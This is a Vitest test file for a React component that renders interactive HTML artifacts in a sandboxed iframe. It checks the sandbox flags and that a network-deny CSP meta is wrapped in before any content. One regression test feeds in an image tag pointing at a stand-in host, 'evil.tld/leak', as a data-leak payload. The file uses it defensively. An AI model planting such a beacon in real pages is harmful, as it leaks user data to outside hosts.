// ADR-0033 D4 (YUK-306) — security-contract test for the sandboxed interactive
// artifact renderer. The unit partition runs in the `node` env with no jsdom /
// @testing-library, so (matching the KnowledgeGraph.render.test.tsx precedent)
// we statically render with react-dom/server's renderToString and assert the
// emitted markup. This pins the two load-bearing layers: the exact iframe
// sandbox value (allow-scripts, NO allow-same-origin) and the network-deny CSP
// meta carried by the always-wrap srcdoc shell (no artifact content may parse
// before the policy — see withCsp).
//
// React escapes attribute values (& → &amp;, " → &quot;, ' → &#x27;, < → &lt;,
// > → &gt;), so srcdoc assertions go through extractSrcdoc() which unescapes
// the attribute back to the document string the iframe will parse.

import { renderToString } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { InteractiveArtifactRenderer } from './InteractiveArtifactRenderer';

function unescapeAttr(value: string): string {
  return value
    .replace(/&quot;/g, '"')
    .replace(/&#x27;/g, "'")
    .replace(/&#39;/g, "'")
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&'); // must be last (it produces no further entities)
}

function extractSrcdoc(markup: string): string {
  const match = markup.match(/srcdoc="([^"]*)"/i);
  if (!match) throw new Error(`no srcdoc attribute in: ${markup}`);
  return unescapeAttr(match[1]);
}

const CSP_META_PREFIX = '<meta http-equiv="Content-Security-Policy" content="';

describe('InteractiveArtifactRenderer', () => {
  it('renders sandbox="allow-scripts" exactly — no allow-same-origin', () => {
    const markup = renderToString(<InteractiveArtifactRenderer html="<p>hi</p>" title="t" />);
    expect(markup).toContain('sandbox="allow-scripts"');
    expect(markup).not.toContain('allow-same-origin');
    expect(markup).not.toContain('allow-forms');
    expect(markup).not.toContain('allow-popups');
    expect(markup).not.toContain('allow-top-navigation');
  });

  it('injects a network-deny CSP into srcdoc', () => {
    const markup = renderToString(<InteractiveArtifactRenderer html="<p>hi</p>" title="t" />);
    const doc = extractSrcdoc(markup);
    expect(doc).toContain('Content-Security-Policy');
    expect(doc).toContain("default-src 'none'");
    expect(doc).toContain("script-src 'unsafe-inline'");
    expect(doc).toContain("base-uri 'none'");
    expect(doc).toContain("form-action 'none'");
    // no host/scheme network source anywhere except local data:/blob:.
    expect(doc).not.toMatch(/connect-src/);
    expect(doc).not.toMatch(/https?:/);
  });

  it('full-document input is still wrapped — CSP meta parses before ALL artifact content', () => {
    const html =
      '<!doctype html><html><head lang="zh"><title>x</title></head><body>b</body></html>';
    const markup = renderToString(<InteractiveArtifactRenderer html={html} title="t" />);
    const doc = extractSrcdoc(markup);
    // shell first: the meta is head's first child with zero content before it.
    expect(doc.startsWith(`<!doctype html><html><head>${CSP_META_PREFIX}`)).toBe(true);
    // the artifact's own markup (incl. its inner doctype/head) comes after the
    // meta; the parser drops the inner doctype and merges duplicate html/head.
    expect(doc.indexOf(CSP_META_PREFIX)).toBeLessThan(doc.indexOf('<head lang="zh">'));
  });

  it('without a <head>, wraps a minimal document shell carrying the meta', () => {
    const markup = renderToString(<InteractiveArtifactRenderer html="<p>fragment</p>" title="t" />);
    const doc = extractSrcdoc(markup);
    expect(doc.startsWith(`<!doctype html><html><head>${CSP_META_PREFIX}`)).toBe(true);
    expect(doc).toContain('<body><p>fragment</p></body>');
  });

  it('emits exactly one CSP meta regardless of embedded head tags', () => {
    const html = '<head></head><head></head>';
    const doc = extractSrcdoc(
      renderToString(<InteractiveArtifactRenderer html={html} title="t" />),
    );
    expect(doc.split(CSP_META_PREFIX)).toHaveLength(2);
    expect(doc.startsWith(`<!doctype html><html><head>${CSP_META_PREFIX}`)).toBe(true);
  });

  it('regression (M1): active content before a <head> cannot precede the CSP', () => {
    // adversarial shape: a network-touching element BEFORE the first <head>.
    // Under head-injection this <img> would parse (and fetch) before any
    // policy existed; always-wrap guarantees the meta parses first.
    const html = '<img src="//evil.tld/leak?d=x"><head></head><body>b</body>';
    const doc = extractSrcdoc(
      renderToString(<InteractiveArtifactRenderer html={html} title="t" />),
    );
    expect(doc.startsWith(`<!doctype html><html><head>${CSP_META_PREFIX}`)).toBe(true);
    expect(doc.indexOf(CSP_META_PREFIX)).toBeLessThan(doc.indexOf('<img'));
    // the commented-head shape gets the same guarantee for free (no injection
    // point to steal): the meta is at a fixed position before the artifact.
    const commented = extractSrcdoc(
      renderToString(
        <InteractiveArtifactRenderer
          html="<!-- <head> --><head><title>x</title></head>"
          title="t"
        />,
      ),
    );
    expect(commented.startsWith(`<!doctype html><html><head>${CSP_META_PREFIX}`)).toBe(true);
  });

  it('carries an a11y title (with fallback) and lazy loading', () => {
    const markup = renderToString(<InteractiveArtifactRenderer html="<p>x</p>" title="函数图像" />);
    expect(markup).toContain('title="函数图像"');
    expect(markup).toContain('loading="lazy"');

    const untitled = renderToString(<InteractiveArtifactRenderer html="<p>x</p>" title="" />);
    expect(untitled).toContain('title="互动内容"');
  });
});
